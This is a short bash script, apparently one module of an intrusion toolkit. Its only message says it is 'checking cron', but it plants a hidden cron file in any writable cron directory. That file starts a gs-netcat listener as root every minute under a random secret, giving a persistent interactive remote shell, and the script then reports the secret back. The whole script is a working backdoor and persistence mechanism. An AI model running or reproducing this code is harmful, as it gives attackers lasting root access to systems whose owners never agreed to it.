#!/bin/bash
source "$(dirname "$0")/00_common.sh"
M="cron"
info "Checking cron..."
for d in /etc/cron.d /etc/cron.daily /var/spool/cron/crontabs; do
    [ -w "$d" ] 2>/dev/null && {
        s=$(cat /dev/urandom|tr -dc 'a-z0-9'|head -c20)
        echo "* * * * * root gs-netcat -s $s -l -i &" > "$d/.x" 2>/dev/null
        result "$M" "success" "$d" "$s"; exit 0
    }
done
result "$M" "fail" "No write" ""; exit 1
